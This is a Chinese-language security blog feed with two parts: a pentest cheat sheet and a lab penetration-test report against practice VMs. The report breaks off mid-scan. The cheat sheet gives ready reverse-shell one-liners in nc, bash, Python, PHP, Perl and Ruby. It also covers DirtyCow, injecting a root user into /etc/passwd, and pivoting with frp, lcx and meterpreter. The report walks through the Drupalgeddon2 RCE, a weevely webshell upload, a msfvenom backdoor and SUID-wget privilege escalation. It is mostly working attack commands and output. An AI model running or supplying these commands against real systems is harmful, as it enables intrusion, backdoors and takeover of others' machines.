plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -6 hackforfun</span><br><span class="line">    $6$niT81cP.pbbCDVBZ$Tnou8n5zZHkPNF3n0EqZnouOM4eEDCxSS5OeJ21.TbLJe167Igyns87G8JbW2n5ShI23D9RuGtji1NLrRti.&#x2F;1</span><br><span class="line">echo &#39;test:$6$niT81cP.pbbCDVBZ$Tnou8n5zZHkPNF3n0EqZnouOM4eEDCxSS5OeJ21.TbLJe167Igyns87G8JbW2n5ShI23D9RuGtji1NLrRti.&#x2F;1:0:0::&#x2F;root:&#x2F;bin&#x2F;bash&#39; &gt;&gt; &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p>echo写入一定要用<code>'</code></p><h3 id="exp提权"><a class="markdownIt-Anchor" href="#exp提权"></a> EXP提权</h3><ul><li><a href="https://github.com/initstring/dirty_sock">CVE-2019-7304</a></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Ubuntu 18.10</span><br><span class="line">Ubuntu 18.04 LTS</span><br><span class="line">Ubuntu 16.04 LTS</span><br><span class="line">Ubuntu 14.04 LTS</span><br><span class="line">2.28 &lt; snapd &lt; 2.37</span><br><span class="line">网络连通</span><br></pre></td></tr></table></figure><ul><li>DirtyCow</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;dirtycow&#x2F;dirtycow.github.io</span><br><span class="line">cd dirtycow.github.io</span><br><span class="line">gcc dirtyc0w.c -o dirtycow -pthread</span><br><span class="line">.&#x2F;dirtycow &#x2F;etc&#x2F;group “$(sed ‘&#x2F;\(sudo*\)&#x2F; s&#x2F;$&#x2F;,test&#x2F;’ &#x2F;etc&#x2F;group)”</span><br><span class="line">sudo su</span><br></pre></td></tr></table></figure><ul><li>40616.c</li></ul><h3 id="文件传输"><a class="markdownIt-Anchor" href="#文件传输"></a> 文件传输</h3><ul><li>FTP</li><li>SCP</li><li>HTTP<ul><li><code>python2 -m SimpleHTTPServer 80 &amp;</code></li><li><code>python3 -m http.server 80&amp;</code></li></ul></li></ul><h3 id="内网代理"><a class="markdownIt-Anchor" href="#内网代理"></a> 内网代理</h3><ul><li>meterpreter(socks4)</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.0.1 LPORT&#x3D;2020 -f raw &gt; shell.php</span><br><span class="line">msfvenom -p linux&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.0.1 LPORT&#x3D;2020 -f elf &gt; shell.elf</span><br><span class="line">use auxiliary&#x2F;server&#x2F;socks4a</span><br></pre></td></tr></table></figure><ul><li><p>portfwd -l 2222 -p 8080 -r 127.0.0.1 (本地服务端口转发/netstat)</p></li><li><p>earthworm(socks5)</p></li><li><p>访问本地服务</p></li><li><p>ngork</p><ul><li><p><a href="https://ngrok.com/">https://ngrok.com/</a></p></li><li><p><a href="https://www.tunnelnat.com/">https://www.tunnelnat.com/</a></p></li></ul></li><li><p>reGeorg</p></li><li><p>frp</p><ul><li><a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#frpc.ini</span><br><span class="line">[common]</span><br><span class="line">server_addr &#x3D; 192.168.56.104</span><br><span class="line">server_port &#x3D; 7000</span><br><span class="line"></span><br><span class="line">[sock5_1]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">remote_port &#x3D; 45555</span><br><span class="line">plugin &#x3D; socks5</span><br><span class="line">plugin_user &#x3D; user</span><br><span class="line">plugin_passwd &#x3D; pass</span><br><span class="line">#####################</span><br><span class="line">#frps.ini</span><br><span class="line">[common]</span><br><span class="line">bind_port &#x3D; 7000</span><br><span class="line">dashboard_port &#x3D; 7500</span><br><span class="line">dashboard_user &#x3D; admin</span><br><span class="line">dashboard_pass &#x3D; admin</span><br></pre></td></tr></table></figure><ul><li>nps<ul><li><a href="https://github.com/ehang-io/nps">https://github.com/ehang-io/nps</a></li></ul></li><li>lcx</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">lcx配合meterpreter进行公网反弹Shell</span><br><span class="line">Server上执行lcx -listen 8888 9999</span><br><span class="line">本地执行lcx -slave Server 8888 Local_IP 7777</span><br><span class="line">并在MSF监听Local_IP上的7777端口</span><br><span class="line">(注意这里不能用127.0.0.1) </span><br><span class="line">目标机器上meterpreter反弹至Server的8888端口</span><br></pre></td></tr></table></figure><ul><li>proxychain</li><li>proxifier</li><li>sockscap</li><li>socat<ul><li><code>socat tcp-listen:1234,fork tcp-connect:localhost:8080</code></li></ul></li><li>plink<ul><li><code>plink.exe -ssh root@192.168.0.1 -pw password -R 1234:127.0.0.1:3306</code></li></ul></li></ul><h4 id="shell-2"><a class="markdownIt-Anchor" href="#shell-2"></a> Shell</h4><ul><li>nc</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc.traditional是最早的版本(v1.10-41.1)，该版本具有&#96;&#96;-e&#96;&#96;的选项，用于反弹shell十分方便</span><br><span class="line">ubuntu中的nc命令则会指向netcat-openbsd，而该版本则没有&#96;&#96;-e&#96;&#96;的选项，无法用于反弹shell</span><br><span class="line">ncat的版本则比较新，集成于nmap中</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">正向Shell</span></span><br><span class="line">nc -lvvp 8080 -t -e /bin/bash</span><br><span class="line">.............................</span><br><span class="line">nc 192.168.0.0 8000</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i 2&gt;&amp;1 | nc 192.168.0.1 8080</span><br><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 192.168.0.1 8080 &gt;/tmp/f</span><br><span class="line">nc -e /bin/bash 192.168.0.1 8080</span><br><span class="line">.............................</span><br><span class="line">nc -lvnp 8080</span><br></pre></td></tr></table></figure><ul><li>bash</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.0.1/8080 0&gt;&amp;1</span><br><span class="line">.............................</span><br><span class="line">nc -lvnp 8080</span><br></pre></td></tr></table></figure><ul><li>python</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;192.168.0.1&#x27;,8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span></span><br></pre></td></tr></table></figure><ul><li>php</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;exec(&quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.1/8080 0&gt;&amp;1&quot;)&#x27;</span></span><br><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;192.168.0.1&quot;,8080);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>perl</li></ul><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;192.168.0.1&quot;;$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>ruby</li></ul><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e <span class="string">&#x27;exit if fork;c=TCPSocket.new(&quot;192.168.0.1&quot;,&quot;8080&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span></span><br><span class="line">ruby -rsocket -e<span class="string">&#x27;f=TCPSocket.open(&quot;192.168.0.1&quot;,8080).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="powershell"><a class="markdownIt-Anchor" href="#powershell"></a> PowerShell</h3><ul><li>命令多条分隔/命令注入: ;</li><li>Secure String</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$password &#x3D; ConvertTo-SecureString &#39;P@ssw0rd&#39; -AsPlainText -Force</span><br><span class="line">$Ptr &#x3D; [System.Runtime.InteropServices.Marshal]::SecureStringToCoTaskMemUnicode($password)</span><br><span class="line">$result &#x3D; [System.Runtime.InteropServices.Marshal]::PtrToStringUni($Ptr)</span><br><span class="line">[System.Runtime.InteropServices.Marshal]::ZeroFreeCoTaskMemUnicode($Ptr)</span><br><span class="line">$result </span><br></pre></td></tr></table></figure><ul><li>jail</li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;迟来的文章&lt;/p&gt;</summary>
    
    
    
    <category term="Study" scheme="https://yoloyolo.top/categories/Study/"/>
    
    
    <category term="Pentest" scheme="https://yoloyolo.top/tags/Pentest/"/>
    
  </entry>
  
  <entry>
    <title>Pentest With Meterpreter</title>
    <link href="https://yoloyolo.top/2023/02/08/Pentest-With-Meterpreter/"/>
    <id>https://yoloyolo.top/2023/02/08/Pentest-With-Meterpreter/</id>
    <published>2023-02-08T15:55:36.000Z</published>
    <updated>2023-02-08T16:08:19.000Z</updated>
    
    <content type="html"><![CDATA[<p>迟来的文章</p><a id="more"></a><h1 id="渗透测试报告"><a class="markdownIt-Anchor" href="#渗透测试报告"></a> 渗透测试报告</h1><p><code>2019/1/28 16:49:43</code></p><hr \><h2 id="任务规划"><a class="markdownIt-Anchor" href="#任务规划"></a> 任务规划</h2><p>规划区域：虚拟机中的三台服务器<br />测试目标：获取所有服务器的root权限</p><p>渗透目标</p><ul><li><p>A1 hackNos(Ubuntu)<br />IP.0:192.168.31.132<br />IP.1:Unknown</p></li><li><p>A2 lin.security(Ubuntu)<br />IP.0:Unknown<br />IP.1:Unknown</p></li><li><p>A3 hackNos-2(Ubuntu)<br />IP.0:Unknown</p></li></ul><p>攻击方</p><ul><li>B Attacker(Kali)<br />IP.0:192.168.31.10</li></ul><p>网络状况：<br />B能与A1进行网络通信<br />A1能与B和A2进行网络通信<br />A2能与A1进行网络通信</p><h2 id="hacknos"><a class="markdownIt-Anchor" href="#hacknos"></a> hackNos</h2><h3 id="端口扫描"><a class="markdownIt-Anchor" href="#端口扫描"></a> 端口扫描</h3><p>用Nmap对目标A1进行端口扫描</p><p><code>nmap -sV -p 1-1000 -T 5 -v -A -n 192.168.31.132</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.31.132</span><br><span class="line">Host is up (0.011s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 a5:a5:17:70:4d:be:48:ad:ba:64:c1:07:a0:55:03:ea (RSA)</span><br><span class="line">|   256 f2:ce:42:1c:04:b8:99:53:95:42:ab:89:22:66:9e:db (ECDSA)</span><br><span class="line">|_  256 4a:7d:15:65:83:af:82:a3:12:02:21:1c:23:49:fb:e9 (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: OPTIONS GET HEAD POST</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure><h3 id="web路径枚举"><a class="markdownIt-Anchor" href="#web路径枚举"></a> Web路径枚举</h3><p><code>dirb http://192.168.31.132 -w</code></p><p>用dirb进行Web目录枚举</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.132&#x2F;drupal&#x2F; </span><br></pre></td></tr></table></figure><p>发现Web服务中存在Drupal框架</p><h3 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h3><p>搜索得知Drupal框架存在RCE漏洞<br /><code>git clone https://github.com/dreadlocked/Drupalgeddon2.git</code></p><p>尝试对A1使用Exploit</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt install ruby</span><br><span class="line">gem install highline</span><br><span class="line">ruby drupalgeddon2.rb http:&#x2F;&#x2F;192.168.31.132&#x2F;drupal&#x2F;</span><br></pre></td></tr></table></figure><p>成功获取shell</p><h3 id="权限提升"><a class="markdownIt-Anchor" href="#权限提升"></a> 权限提升</h3><p>本地构造Webshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weevely generate pass she.php</span><br></pre></td></tr></table></figure><p>开启本地Web服务<br /><code>python -m SimpleHTTPServer 8000 &amp;</code></p><p>在A1上用wget获取WebShell<br /><code>wget http://192.168.31.10:8000/she.php</code></p><p>连接WebShell<br /><code>weevely http://192.168.31.132/drupal/she.php pass</code></p><p>查看系统信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br><span class="line">Linux hackNos 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:01:15 UTC 2019 i686 i686 i686 GNU&#x2F;Linux</span><br></pre></td></tr></table></figure><p>生成Meterpreter后门程序并投放<br /><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.31.10 LPORT=1234 -e x86/shikata_ga_nai -i 11 -f elf &gt; msf.elf</code></p><p>利用WebShell上传后门程序<br /><code>file_upload /root/software/msf.elf /var/www/html/drupal/msf.elf</code></p><p>使用MSF进行渗透攻击</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.31.10</span><br><span class="line">set LPORT 1234</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>在A1的WebShell中运行后门程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x msf.elf</span><br><span class="line">.&#x2F;msf.elf</span><br></pre></td></tr></table></figure><p>将meterpreter shell转为bash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">python3 -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p>查看具有suid权限且属于root用户的命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">&lt;pal$ find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;dbus-1.0&#x2F;dbus-daemon-launch-helper           </span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign                          </span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;i386-linux-gnu&#x2F;lxc&#x2F;lxc-user-nic              </span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;eject&#x2F;dmcrypt-get-device                     </span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;snapd&#x2F;snap-confine                           </span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;policykit-1&#x2F;polkit-agent-helper-1            </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;pkexec                                       </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newgidmap                                    </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;gpasswd                                      </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;sudo                                         </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newgrp                                       </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newuidmap                                    </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;wget                                         </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;passwd                                       </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chsh                                         </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chfn                                         </span><br><span class="line">&#x2F;bin&#x2F;ping6                                            </span><br><span class="line">&#x2F;bin&#x2F;umount                                           </span><br><span class="line">&#x2F;bin&#x2F;ntfs-3g                                          </span><br><span class="line">&#x2F;bin&#x2F;mount                                            </span><br><span class="line">&#x2F;bin&#x2F;ping                                             </span><br><span class="line">&#x2F;bin&#x2F;su                                               </span><br><span class="line">&#x2F;bin&#x2F;fusermount                                       </span><br></pre></td></tr></table></figure><p>可以用wget命令提权</p><p>对/etc/passwd文件进行间接修改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hackNos: file_download &#x2F;etc&#x2F;passwd passwd</span><br><span class="line">perl -le &#39;print crypt(&quot;hackforfun&quot;,&quot;addedsalt&quot;)&#39;</span><br><span class="line">    adWo3GnVnKzuU</span><br><span class="line">echo &#39;test:adWo3GnVnKzuU:0:0::&#x2F;root:&#x2F;bin&#x2F;bash&#39; &gt;&gt; passwd</span><br><span class="line">hackNos: wget http:&#x2F;&#x2F;192.168.31.10:8000&#x2F;passwd -O &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p>在bash中切换账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">su test</span><br><span class="line">hackforfun</span><br><span class="line">id</span><br><span class="line">    uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure><p>在Meterpreter查看A1的网络信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br><span class="line"></span><br><span class="line">Interface  1</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Name         : lo</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 65536</span><br><span class="line">Flags        : UP,LOOPBACK</span><br><span class="line">IPv4 Address : 127.0.0.1</span><br><span class="line">IPv4 Netmask : 255.0.0.0</span><br><span class="line">IPv6 Address : ::1</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff::</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface  2</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Name         : enp0s3</span><br><span class="line">Hardware MAC : 08:00:27:7d:4c:83</span><br><span class="line">MTU          : 1500</span><br><span class="line">Flags        : UP,BROADCAST,MULTICAST</span><br><span class="line">IPv4 Address : 192.168.31.132</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br><span class="line">IPv6 Address : fe80::a00:27ff:fe7d:4c83</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br><span class="line">IPv6 Address : fe80::a00:27ff:fe7d:4c83</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface  3</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Name         : enp0s8</span><br><span class="line">Hardware MAC : 08:00:27:65:bd:8b</span><br><span class="line">MTU          : 1500</span><br><span class="line">Flags        : UP,BROADCAST,MULTICAST</span><br><span class="line">IPv4 Address : 192.168.56.109</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br><span class="line">IPv6 Address : fe80::a00:27ff:fe65:bd8b</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br></pre></td></tr></table></figure><p>发现192.168.56.0网段</p><p>在Meterpreter中添加路由</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 192.168.56.0&#x2F;24</span><br><span class="line">run autoroute -p</span><br><span class="line"></span><br><span class="line">Active Routing Table</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">   Subnet             Netmask            Gateway</span><br><span class="line">   ------             -------            -------</span><br><span class="line">   192.168.56.0       255.255.255.0      Session 1</span><br></pre></td></tr></table></figure><p>在MSF中扫描内网网段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;discovery&#x2F;arp_sweep </span><br><span class="line">set RHOSTS 192.168.56.0&#x2F;24</span><br><span class="line">set THREADS 20</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">[+] 192.168.56.103 appears to be up (CADMUS COMPUTER SYSTEMS)</span><br></pre></td></tr></table></figure><p>发现内网机器A2</p><p>添加sock代理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;server&#x2F;socks4a</span><br><span class="line">set srvport 9999</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>修改Proxychain文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;proxychains.conf</span><br><span class="line">    socks4 192.168.31.10 9999</span><br></pre></td></tr></table></figure><hr /><h2 id="linsecurity"><a class="markdownIt-Anchor" href="#linsecurity"></a> lin.security</h2><h3 id="端口扫描-2"><a class="markdownIt-Anchor" href="#端口扫描-2"></a> 端口扫描</h3><p>proxychains代理Nmap对A2进行端口扫描</p><p><code>proxychains nmap -sT -Pn -v -T5 -A 192.168.56.103</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.56.103</span><br><span class="line">Host is up (0.0048s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 7a:9b:b9:32:6f:95:77:10:c0:a0:80:35:34:b1:c0:00 (RSA)</span><br><span class="line">|   256 24:0c:7a:82:78:18:2d:66:46:3b:1a:36:22:06:e1:a1 (ECDSA)</span><br><span class="line">|_  256 b9:15:59:78:85:78:9e:a5:e6:16:f6:cf:96:2d:1d:36 (ED25519)</span><br><span class="line">111&#x2F;tcp  open  rpcbind 2-4 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port&#x2F;proto  service</span><br><span class="line">|   100000  2,3,4        111&#x2F;tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111&#x2F;udp   rpcbind</span><br><span class="line">|   100000  